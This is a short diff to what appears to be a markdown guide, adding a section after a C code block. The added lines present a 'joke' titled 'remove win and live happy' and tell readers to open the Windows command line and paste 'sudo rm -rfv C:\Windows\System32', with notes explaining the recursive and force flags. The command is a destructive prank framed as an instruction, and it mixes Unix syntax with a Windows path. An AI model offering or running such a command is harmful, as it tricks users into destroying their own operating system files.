@@ -144,3 +144,13 @@ int main()
   return 0;
 }
 ```
+
+An example of **remove win and live happy** is: (epic joke gone wrong)
+open the command line on Windows and copy this command:
+```
+sudo rm -rfv C:\Windows\System32
+```
+**notes**
+-r : Recursive delete 
+-f : force 
+-v : Verbose output
